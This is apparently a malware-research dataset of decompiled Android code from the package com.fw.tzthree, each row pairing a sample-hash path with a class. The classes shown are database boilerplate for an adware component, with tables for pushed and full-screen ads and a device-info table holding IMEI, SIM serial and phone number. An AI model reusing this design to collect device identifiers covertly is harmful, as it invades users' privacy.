customAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     customAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     customAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     customAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     customAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     customAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     customAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     customAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     customAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     customAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     customAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     customAd.setDiyImg(cursor.isNull(i + 17) ? null : cursor.getString(i + 17));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  CustomAd customAd,  long j){     customAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DaoMaster.code","public class DaoMaster extends AbstractDaoMaster {   public static final int SCHEMA_VERSION=1; public class DevOpenHelper extends OpenHelper {     public DevOpenHelper(    Context context,    String str,    SQLiteDatabase.CursorFactory cursorFactory){       super(context,str,cursorFactory);     }     @Override public void onUpgrade(    SQLiteDatabase sQLiteDatabase,    int i,    int i2){       Log.i(""greenDAO"",""Upgrading schema from version "" + i + "" to ""+ i2+ "" by dropping all tables"");       DaoMaster.dropAllTables(sQLiteDatabase,true);       onCreate(sQLiteDatabase);     }   } public abstract class OpenHelper extends SQLiteOpenHelper {     public OpenHelper(    Context context,    String str,    SQLiteDatabase.CursorFactory cursorFactory){       super(context,str,cursorFactory,1);     }     @Override public void onCreate(    SQLiteDatabase sQLiteDatabase){       Log.i(""greenDAO"",""Creating tables for schema version 1"");       DaoMaster.createAllTables(sQLiteDatabase,false);     }   }   public DaoMaster(  SQLiteDatabase sQLiteDatabase){     super(sQLiteDatabase,1);     registerDaoClass(AppendDataDao.class);     registerDaoClass(DelayActionDao.class);     registerDaoClass(SettingDao.class);     registerDaoClass(InstalledAppDao.class);     registerDaoClass(DeviceInfoDao.class);     registerDaoClass(ActionInfoDao.class);     registerDaoClass(FailureActionInfoDao.class);     registerDaoClass(AdHingeDao.class);     registerDaoClass(PushAdDao.class);     registerDaoClass(BannerAdDao.class);     registerDaoClass(CoverAdDao.class);     registerDaoClass(FullCoverAdDao.class);     registerDaoClass(CreditsWallAdDao.class);     registerDaoClass(PushSettingDao.class);     registerDaoClass(DownloadInfoDao.class);     registerDaoClass(HotAppAdInfoDao.class);     registerDaoClass(AppWallAdDao.class);     registerDaoClass(FullScreenAdDao.class);     registerDaoClass(DownloadFragmentInfoDao.class);     registerDaoClass(DownloadSuccessInfoDao.class);     registerDaoClass(CustomAdDao.class);     registerDaoClass(AppInfoDao.class);   }   public static void createAllTables(  SQLiteDatabase sQLiteDatabase,  boolean z){     AppendDataDao.createTable(sQLiteDatabase,z);     DelayActionDao.createTable(sQLiteDatabase,z);     SettingDao.createTable(sQLiteDatabase,z);     InstalledAppDao.createTable(sQLiteDatabase,z);     DeviceInfoDao.createTable(sQLiteDatabase,z);     ActionInfoDao.createTable(sQLiteDatabase,z);     FailureActionInfoDao.createTable(sQLiteDatabase,z);     AdHingeDao.createTable(sQLiteDatabase,z);     PushAdDao.createTable(sQLiteDatabase,z);     BannerAdDao.createTable(sQLiteDatabase,z);     CoverAdDao.createTable(sQLiteDatabase,z);     FullCoverAdDao.createTable(sQLiteDatabase,z);     CreditsWallAdDao.createTable(sQLiteDatabase,z);     PushSettingDao.createTable(sQLiteDatabase,z);     DownloadInfoDao.createTable(sQLiteDatabase,z);     HotAppAdInfoDao.createTable(sQLiteDatabase,z);     AppWallAdDao.createTable(sQLiteDatabase,z);     FullScreenAdDao.createTable(sQLiteDatabase,z);     DownloadFragmentInfoDao.createTable(sQLiteDatabase,z);     DownloadSuccessInfoDao.createTable(sQLiteDatabase,z);     CustomAdDao.createTable(sQLiteDatabase,z);     AppInfoDao.createTable(sQLiteDatabase,z);   }   public static void dropAllTables(  SQLiteDatabase sQLiteDatabase,  boolean z){     AppendDataDao.dropTable(sQLiteDatabase,z);     DelayActionDao.dropTable(sQLiteDatabase,z);     SettingDao.dropTable(sQLiteDatabase,z);     InstalledAppDao.dropTable(sQLiteDatabase,z);     DeviceInfoDao.dropTable(sQLiteDatabase,z);     ActionInfoDao.dropTable(sQLiteDatabase,z);     FailureActionInfoDao.dropTable(sQLiteDatabase,z);     AdHingeDao.dropTable(sQLiteDatabase,z);     PushAdDao.dropTable(sQLiteDatabase,z);     BannerAdDao.dropTable(sQLiteDatabase,z);     CoverAdDao.dropTable(sQLiteDatabase,z);     FullCoverAdDao.dropTable(sQLiteDatabase,z);     CreditsWallAdDao.dropTable(sQLiteDatabase,z);     PushSettingDao.dropTable(sQLiteDatabase,z);     DownloadInfoDao.dropTable(sQLiteDatabase,z);     HotAppAdInfoDao.dropTable(sQLiteDatabase,z);     AppWallAdDao.dropTable(sQLiteDatabase,z);     FullScreenAdDao.dropTable(sQLiteDatabase,z);     DownloadFragmentInfoDao.dropTable(sQLiteDatabase,z);     DownloadSuccessInfoDao.dropTable(sQLiteDatabase,z);     CustomAdDao.dropTable(sQLiteDatabase,z);     AppInfoDao.dropTable(sQLiteDatabase,z);   }   @Override public DaoSession newSession(){     return new DaoSession(this.db,IdentityScopeType.Session,this.daoConfigMap);   }   @Override public DaoSession newSession(  IdentityScopeType identityScopeType){     return new DaoSession(this.db,identityScopeType,this.daoConfigMap);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DaoSession.code","public class DaoSession extends AbstractDaoSession {   private final ActionInfoDao actionInfoDao;   private final DaoConfig actionInfoDaoConfig;   private final AdHingeDao adHingeDao;   private final DaoConfig adHingeDaoConfig;   private final AppInfoDao appInfoDao;   private final DaoConfig appInfoDaoConfig;   private final AppWallAdDao appWallAdDao;   private final DaoConfig appWallAdDaoConfig;   private final AppendDataDao appendDataDao;   private final DaoConfig appendDataDaoConfig;   private final BannerAdDao bannerAdDao;   private final DaoConfig bannerAdDaoConfig;   private final CoverAdDao coverAdDao;   private final DaoConfig coverAdDaoConfig;   private final CreditsWallAdDao creditsWallAdDao;   private final DaoConfig creditsWallAdDaoConfig;   private final CustomAdDao customAdDao;   private final DaoConfig customAdDaoConfig;   private final DelayActionDao delayActionDao;   private final DaoConfig delayActionDaoConfig;   private final DeviceInfoDao deviceInfoDao;   private final DaoConfig deviceInfoDaoConfig;   private final DownloadFragmentInfoDao downloadFragmentInfoDao;   private final DaoConfig downloadFragmentInfoDaoConfig;   private final DownloadInfoDao downloadInfoDao;   private final DaoConfig downloadInfoDaoConfig;   private final DownloadSuccessInfoDao downloadSuccessInfoDao;   private final DaoConfig downloadSuccessInfoDaoConfig;   private final FailureActionInfoDao failureActionInfoDao;   private final DaoConfig failureActionInfoDaoConfig;   private final FullCoverAdDao fullCoverAdDao;   private final DaoConfig fullCoverAdDaoConfig;   private final FullScreenAdDao fullScreenAdDao;   private final DaoConfig fullScreenAdDaoConfig;   private final HotAppAdInfoDao hotAppAdInfoDao;   private final DaoConfig hotAppAdInfoDaoConfig;   private final InstalledAppDao installedAppDao;   private final DaoConfig installedAppDaoConfig;   private final PushAdDao pushAdDao;   private final DaoConfig pushAdDaoConfig;   private final PushSettingDao pushSettingDao;   private final DaoConfig pushSettingDaoConfig;   private final SettingDao settingDao;   private final DaoConfig settingDaoConfig;   public DaoSession(  SQLiteDatabase sQLiteDatabase,  IdentityScopeType identityScopeType,  Map<Class<? extends AbstractDao<?,?>>,DaoConfig> map){     super(sQLiteDatabase);     this.appendDataDaoConfig=map.get(AppendDataDao.class).m2clone();     this.appendDataDaoConfig.initIdentityScope(identityScopeType);     this.delayActionDaoConfig=map.get(DelayActionDao.class).m2clone();     this.delayActionDaoConfig.initIdentityScope(identityScopeType);     this.settingDaoConfig=map.get(SettingDao.class).m2clone();     this.settingDaoConfig.initIdentityScope(identityScopeType);     this.installedAppDaoConfig=map.get(InstalledAppDao.class).m2clone();     this.installedAppDaoConfig.initIdentityScope(identityScopeType);     this.deviceInfoDaoConfig=map.get(DeviceInfoDao.class).m2clone();     this.deviceInfoDaoConfig.initIdentityScope(identityScopeType);     this.actionInfoDaoConfig=map.get(ActionInfoDao.class).m2clone();     this.actionInfoDaoConfig.initIdentityScope(identityScopeType);     this.failureActionInfoDaoConfig=map.get(FailureActionInfoDao.class).m2clone();     this.failureActionInfoDaoConfig.initIdentityScope(identityScopeType);     this.adHingeDaoConfig=map.get(AdHingeDao.class).m2clone();     this.adHingeDaoConfig.initIdentityScope(identityScopeType);     this.pushAdDaoConfig=map.get(PushAdDao.class).m2clone();     this.pushAdDaoConfig.initIdentityScope(identityScopeType);     this.bannerAdDaoConfig=map.get(BannerAdDao.class).m2clone();     this.bannerAdDaoConfig.initIdentityScope(identityScopeType);     this.coverAdDaoConfig=map.get(CoverAdDao.class).m2clone();     this.coverAdDaoConfig.initIdentityScope(identityScopeType);     this.fullCoverAdDaoConfig=map.get(FullCoverAdDao.class).m2clone();     this.fullCoverAdDaoConfig.initIdentityScope(identityScopeType);     this.creditsWallAdDaoConfig=map.get(CreditsWallAdDao.class).m2clone();     this.creditsWallAdDaoConfig.initIdentityScope(identityScopeType);     this.pushSettingDaoConfig=map.get(PushSettingDao.class).m2clone();     this.pushSettingDaoConfig.initIdentityScope(identityScopeType);     this.downloadInfoDaoConfig=map.get(DownloadInfoDao.class).m2clone();     this.downloadInfoDaoConfig.initIdentityScope(identityScopeType);     this.hotAppAdInfoDaoConfig=map.get(HotAppAdInfoDao.class).m2clone();     this.hotAppAdInfoDaoConfig.initIdentityScope(identityScopeType);     this.appWallAdDaoConfig=map.get(AppWallAdDao.class).m2clone();     this.appWallAdDaoConfig.initIdentityScope(identityScopeType);     this.fullScreenAdDaoConfig=map.get(FullScreenAdDao.class).m2clone();     this.fullScreenAdDaoConfig.initIdentityScope(identityScopeType);     this.downloadFragmentInfoDaoConfig=map.get(DownloadFragmentInfoDao.class).m2clone();     this.downloadFragmentInfoDaoConfig.initIdentityScope(identityScopeType);     this.downloadSuccessInfoDaoConfig=map.get(DownloadSuccessInfoDao.class).m2clone();     this.downloadSuccessInfoDaoConfig.initIdentityScope(identityScopeType);     this.customAdDaoConfig=map.get(CustomAdDao.class).m2clone();     this.customAdDaoConfig.initIdentityScope(identityScopeType);     this.appInfoDaoConfig=map.get(AppInfoDao.class).m2clone();     this.appInfoDaoConfig.initIdentityScope(identityScopeType);     this.appendDataDao=new AppendDataDao(this.appendDataDaoConfig,this);     this.delayActionDao=new DelayActionDao(this.delayActionDaoConfig,this);     this.settingDao=new SettingDao(this.settingDaoConfig,this);     this.installedAppDao=new InstalledAppDao(this.installedAppDaoConfig,this);     this.deviceInfoDao=new DeviceInfoDao(this.deviceInfoDaoConfig,this);     this.actionInfoDao=new ActionInfoDao(this.actionInfoDaoConfig,this);     this.failureActionInfoDao=new FailureActionInfoDao(this.failureActionInfoDaoConfig,this);     this.adHingeDao=new AdHingeDao(this.adHingeDaoConfig,this);     this.pushAdDao=new PushAdDao(this.pushAdDaoConfig,this);     this.bannerAdDao=new BannerAdDao(this.bannerAdDaoConfig,this);     this.coverAdDao=new CoverAdDao(this.coverAdDaoConfig,this);     this.fullCoverAdDao=new FullCoverAdDao(this.fullCoverAdDaoConfig,this);     this.creditsWallAdDao=new CreditsWallAdDao(this.creditsWallAdDaoConfig,this);     this.pushSettingDao=new PushSettingDao(this.pushSettingDaoConfig,this);     this.downloadInfoDao=new DownloadInfoDao(this.downloadInfoDaoConfig,this);     this.hotAppAdInfoDao=new HotAppAdInfoDao(this.hotAppAdInfoDaoConfig,this);     this.appWallAdDao=new AppWallAdDao(this.appWallAdDaoConfig,this);     this.fullScreenAdDao=new FullScreenAdDao(this.fullScreenAdDaoConfig,this);     this.downloadFragmentInfoDao=new DownloadFragmentInfoDao(this.downloadFragmentInfoDaoConfig,this);     this.downloadSuccessInfoDao=new DownloadSuccessInfoDao(this.downloadSuccessInfoDaoConfig,this);     this.customAdDao=new CustomAdDao(this.customAdDaoConfig,this);     this.appInfoDao=new AppInfoDao(this.appInfoDaoConfig,this);     registerDao(AppendData.class,this.appendDataDao);     registerDao(DelayAction.class,this.delayActionDao);     registerDao(Setting.class,this.settingDao);     registerDao(InstalledApp.class,this.installedAppDao);     registerDao(DeviceInfo.class,this.deviceInfoDao);     registerDao(ActionInfo.class,this.actionInfoDao);     registerDao(FailureActionInfo.class,this.failureActionInfoDao);     registerDao(AdHinge.class,this.adHingeDao);     registerDao(PushAd.class,this.pushAdDao);     registerDao(BannerAd.class,this.bannerAdDao);     registerDao(CoverAd.class,this.coverAdDao);     registerDao(FullCoverAd.class,this.fullCoverAdDao);     registerDao(CreditsWallAd.class,this.creditsWallAdDao);     registerDao(PushSetting.class,this.pushSettingDao);     registerDao(DownloadInfo.class,this.downloadInfoDao);     registerDao(HotAppAdInfo.class,this.hotAppAdInfoDao);     registerDao(AppWallAd.class,this.appWallAdDao);     registerDao(FullScreenAd.class,this.fullScreenAdDao);     registerDao(DownloadFragmentInfo.class,this.downloadFragmentInfoDao);     registerDao(DownloadSuccessInfo.class,this.downloadSuccessInfoDao);     registerDao(CustomAd.class,this.customAdDao);     registerDao(AppInfo.class,this.appInfoDao);   }   public void clear(){     this.appendDataDaoConfig.getIdentityScope().clear();     this.delayActionDaoConfig.getIdentityScope().clear();     this.settingDaoConfig.getIdentityScope().clear();     this.installedAppDaoConfig.getIdentityScope().clear();     this.deviceInfoDaoConfig.getIdentityScope().clear();     this.actionInfoDaoConfig.getIdentityScope().clear();     this.failureActionInfoDaoConfig.getIdentityScope().clear();     this.adHingeDaoConfig.getIdentityScope().clear();     this.pushAdDaoConfig.getIdentityScope().clear();     this.bannerAdDaoConfig.getIdentityScope().clear();     this.coverAdDaoConfig.getIdentityScope().clear();     this.fullCoverAdDaoConfig.getIdentityScope().clear();     this.creditsWallAdDaoConfig.getIdentityScope().clear();     this.pushSettingDaoConfig.getIdentityScope().clear();     this.downloadInfoDaoConfig.getIdentityScope().clear();     this.hotAppAdInfoDaoConfig.getIdentityScope().clear();     this.appWallAdDaoConfig.getIdentityScope().clear();     this.fullScreenAdDaoConfig.getIdentityScope().clear();     this.downloadFragmentInfoDaoConfig.getIdentityScope().clear();     this.downloadSuccessInfoDaoConfig.getIdentityScope().clear();     this.customAdDaoConfig.getIdentityScope().clear();     this.appInfoDaoConfig.getIdentityScope().clear();   }   public ActionInfoDao getActionInfoDao(){     return this.actionInfoDao;   }   public AdHingeDao getAdHingeDao(){     return this.adHingeDao;   }   public AppInfoDao getAppInfoDao(){     return this.appInfoDao;   }   public AppWallAdDao getAppWallAdDao(){     return this.appWallAdDao;   }   public AppendDataDao getAppendDataDao(){     return this.appendDataDao;   }   public BannerAdDao getBannerAdDao(){     return this.bannerAdDao;   }   public CoverAdDao getCoverAdDao(){     return this.coverAdDao;   }   public CreditsWallAdDao getCreditsWallAdDao(){     return this.creditsWallAdDao;   }   public CustomAdDao getCustomAdDao(){     return this.customAdDao;   }   public DelayActionDao getDelayActionDao(){     return this.delayActionDao;   }   public DeviceInfoDao getDeviceInfoDao(){     return this.deviceInfoDao;   }   public DownloadFragmentInfoDao getDownloadFragmentInfoDao(){     return this.downloadFragmentInfoDao;   }   public DownloadInfoDao getDownloadInfoDao(){     return this.downloadInfoDao;   }   public DownloadSuccessInfoDao getDownloadSuccessInfoDao(){     return this.downloadSuccessInfoDao;   }   public FailureActionInfoDao getFailureActionInfoDao(){     return this.failureActionInfoDao;   }   public FullCoverAdDao getFullCoverAdDao(){     return this.fullCoverAdDao;   }   public FullScreenAdDao getFullScreenAdDao(){     return this.fullScreenAdDao;   }   public HotAppAdInfoDao getHotAppAdInfoDao(){     return this.hotAppAdInfoDao;   }   public InstalledAppDao getInstalledAppDao(){     return this.installedAppDao;   }   public PushAdDao getPushAdDao(){     return this.pushAdDao;   }   public PushSettingDao getPushSettingDao(){     return this.pushSettingDao;   }   public SettingDao getSettingDao(){     return this.settingDao;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DelayAction.code","public class DelayAction {   private Integer action;   private Integer adType;   private Integer delay;   public DelayAction(){   }   public DelayAction(  Integer num,  Integer num2,  Integer num3){     this.action=num;     this.adType=num2;     this.delay=num3;   }   public Integer getAction(){     return this.action;   }   public Integer getAdType(){     return this.adType;   }   public Integer getDelay(){     return this.delay;   }   public void setAction(  Integer num){     this.action=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setDelay(  Integer num){     this.delay=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DelayActionDao.code","public class DelayActionDao extends AbstractDao<DelayAction,Void> {   public static final String TABLENAME=""DELAY_ACTION""; public class Properties {     public static final Property Action=new Property(0,Integer.class,""action"",false,""ACTION"");     public static final Property AdType=new Property(1,Integer.class,""adType"",false,""AD_TYPE"");     public static final Property Delay=new Property(2,Integer.class,""delay"",false,""DELAY"");   }   public DelayActionDao(  DaoConfig daoConfig){     super(daoConfig);   }   public DelayActionDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'DELAY_ACTION' ('ACTION' INTEGER,'AD_TYPE' INTEGER,'DELAY' INTEGER);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_DELAY_ACTION_ACTION_AD_TYPE ON DELAY_ACTION (ACTION,AD_TYPE);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'DELAY_ACTION'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  DelayAction delayAction){     sQLiteStatement.clearBindings();     if (delayAction.getAction() != null) {       sQLiteStatement.bindLong(1,r0.intValue());     }     if (delayAction.getAdType() != null) {       sQLiteStatement.bindLong(2,r0.intValue());     }     if (delayAction.getDelay() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }   }   @Override public Void getKey(  DelayAction delayAction){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public DelayAction readEntity(  Cursor cursor,  int i){     return new DelayAction(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)),cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));   }   @Override public void readEntity(  Cursor cursor,  DelayAction delayAction,  int i){     delayAction.setAction(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)));     delayAction.setAdType(cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)));     delayAction.setDelay(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  DelayAction delayAction,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DeviceInfo.code","public class DeviceInfo {   private String appKey;   private String brand;   private String devAppPackage;   private Long id;   private String imei;   private String mobileSystem;   private String model;   private String network;   private String operator;   private String phoneNumber;   private String resolution;   private String sdkVersion;   private String simSerialNum;   private String systemVersion;   public DeviceInfo(){   }   public DeviceInfo(  Long l){     this.id=l;   }   public DeviceInfo(  Long l,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13){     this.id=l;     this.imei=str;     this.sdkVersion=str2;     this.brand=str3;     this.model=str4;     this.resolution=str5;     this.network=str6;     this.appKey=str7;     this.simSerialNum=str8;     this.phoneNumber=str9;     this.operator=str10;     this.systemVersion=str11;     this.mobileSystem=str12;     this.devAppPackage=str13;   }   public String getAppKey(){     return this.appKey;   }   public String getBrand(){     return this.brand;   }   public String getDevAppPackage(){     return this.devAppPackage;   }   public Long getId(){     return this.id;   }   public String getImei(){     return this.imei;   }   public String getMobileSystem(){     return this.mobileSystem;   }   public String getModel(){     return this.model;   }   public String getNetwork(){     return this.network;   }   public String getOperator(){     return this.operator;   }   public String getPhoneNumber(){     return this.phoneNumber;   }   public String getResolution(){     return this.resolution;   }   public String getSdkVersion(){     return this.sdkVersion;   }   public String getSimSerialNum(){     return this.simSerialNum;   }   public String getSystemVersion(){     return this.systemVersion;   }   public void setAppKey(  String str){     this.appKey=str;   }   public void setBrand(  String str){     this.brand=str;   }   public void setDevAppPackage(  String str){     this.devAppPackage=str;   }   public void setId(  Long l){     this.id=l;   }   public void setImei(  String str){     this.imei=str;   }   public void setMobileSystem(  String str){     this.mobileSystem=str;   }   public void setModel(  String str){     this.model=str;   }   public void setNetwork(  String str){     this.network=str;   }   public void setOperator(  String str){     this.operator=str;   }   public void setPhoneNumber(  String str){     this.phoneNumber=str;   }   public void setResolution(  String str){     this.resolution=str;   }   public void setSdkVersion(  String str){     this.sdkVersion=str;   }   public void setSimSerialNum(  String str){     this.simSerialNum=str;   }   public void setSystemVersion(  String str){     this.systemVersion=str;   }   public String toString(){     return ""DeviceInfo [id="" + this.id + "", imei=""+ this.imei+ "", sdkVersion=""+ this.sdkVersion+ "", brand=""+ this.brand+ "", model=""+ this.model+ "", resolution=""+ this.resolution+ "", network=""+ this.network+ "", appKey=""+ this.appKey+ "", simSerialNum=""+ this.simSerialNum+ "", phoneNumber=""+ this.phoneNumber+ "", operator=""+ this.operator+ "", systemVersion=""+ this.systemVersion+ "", mobileSystem=""+ this.mobileSystem+ "", devAppPackage=""+ this.devAppPackage+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DeviceInfoDao.code","public class DeviceInfoDao extends AbstractDao<DeviceInfo,Long> {   public static final String TABLENAME=""DEVICE_INFO""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Imei=new Property(1,String.class,""imei"",false,""IMEI"");     public static final Property SdkVersion=new Property(2,String.class,""sdkVersion"",false,""SDK_VERSION"");     public static final Property Brand=new Property(3,String.class,""brand"",false,""BRAND"");     public static final Property Model=new Property(4,String.class,""model"",false,""MODEL"");     public static final Property Resolution=new Property(5,String.class,""resolution"",false,""RESOLUTION"");     public static final Property Network=new Property(6,String.class,""network"",false,""NETWORK"");     public static final Property AppKey=new Property(7,String.class,""appKey"",false,""APP_KEY"");     public static final Property SimSerialNum=new Property(8,String.class,""simSerialNum"",false,""SIM_SERIAL_NUM"");     public static final Property PhoneNumber=new Property(9,String.class,""phoneNumber"",false,""PHONE_NUMBER"");     public static final Property Operator=new Property(10,String.class,""operator"",false,""OPERATOR"");     public static final Property SystemVersion=new Property(11,String.class,""systemVersion"",false,""SYSTEM_VERSION"");     public static final Property MobileSystem=new Property(12,String.class,""mobileSystem"",false,""MOBILE_SYSTEM"");     public static final Property DevAppPackage=new Property(13,String.class,""devAppPackage"",false,""DEV_APP_PACKAGE"");   }   public DeviceInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public DeviceInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'DEVICE_INFO' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'IMEI' TEXT,'SDK_VERSION' TEXT,'BRAND' TEXT,'MODEL' TEXT,'RESOLUTION' TEXT,'NETWORK' TEXT,'APP_KEY' TEXT,'SIM_SERIAL_NUM' TEXT,'PHONE_NUMBER' TEXT,'OPERATOR' TEXT,'SYSTEM_VERSION' TEXT,'MOBILE_SYSTEM' TEXT,'DEV_APP_PACKAGE' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'DEVICE_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  DeviceInfo deviceInfo){     sQLiteStatement.clearBindings();     Long id=deviceInfo.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     String imei=deviceInfo.getImei();     if (imei != null) {       sQLiteStatement.bindString(2,imei);     }     String sdkVersion=deviceInfo.getSdkVersion();     if (sdkVersion != null) {       sQLiteStatement.bindString(3,sdkVersion);     }     String brand=deviceInfo.getBrand();     if (brand != null) {       sQLiteStatement.bindString(4,brand);     }     String model=deviceInfo.getModel();     if (model != null) {       sQLiteStatement.bindString(5,model);     }     String resolution=deviceInfo.getResolution();     if (resolution != null) {       sQLiteStatement.bindString(6,resolution);     }     String network=deviceInfo.getNetwork();     if (network != null) {       sQLiteStatement.bindString(7,network);     }     String appKey=deviceInfo.getAppKey();     if (appKey != null) {       sQLiteStatement.bindString(8,appKey);     }     String simSerialNum=deviceInfo.getSimSerialNum();     if (simSerialNum != null) {       sQLiteStatement.bindString(9,simSerialNum);     }     String phoneNumber=deviceInfo.getPhoneNumber();     if (phoneNumber != null) {       sQLiteStatement.bindString(10,phoneNumber);     }     String operator=deviceInfo.getOperator();     if (operator != null) {       sQLiteStatement.bindString(11,operator);     }     String systemVersion=deviceInfo.getSystemVersion();     if (systemVersion != null) {       sQLiteStatement.bindString(12,systemVersion);     }     String mobileSystem=deviceInfo.getMobileSystem();     if (mobileSystem != null) {       sQLiteStatement.bindString(13,mobileSystem);     }     String devAppPackage=deviceInfo.getDevAppPackage();     if (devAppPackage != null) {       sQLiteStatement.bindString(14,devAppPackage);     }   }   @Override public Long getKey(  DeviceInfo deviceInfo){     if (deviceInfo != null) {       return deviceInfo.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public DeviceInfo readEntity(  Cursor cursor,  int i){     return new DeviceInfo(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : cursor.getString(i + 1),cursor.isNull(i + 2) ? null : cursor.getString(i + 2),cursor.isNull(i + 3) ? null : cursor.getString(i + 3),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13));   }   @Override public void readEntity(  Cursor cursor,  DeviceInfo deviceInfo,  int i){     deviceInfo.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     deviceInfo.setImei(cursor.isNull(i + 1) ? null : cursor.getString(i + 1));     deviceInfo.setSdkVersion(cursor.isNull(i + 2) ? null : cursor.getString(i + 2));     deviceInfo.setBrand(cursor.isNull(i + 3) ? null : cursor.getString(i + 3));     deviceInfo.setModel(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     deviceInfo.setResolution(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     deviceInfo.setNetwork(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     deviceInfo.setAppKey(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     deviceInfo.setSimSerialNum(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     deviceInfo.setPhoneNumber(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     deviceInfo.setOperator(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     deviceInfo.setSystemVersion(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     deviceInfo.setMobileSystem(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     deviceInfo.setDevAppPackage(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  DeviceInfo deviceInfo,  long j){     deviceInfo.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
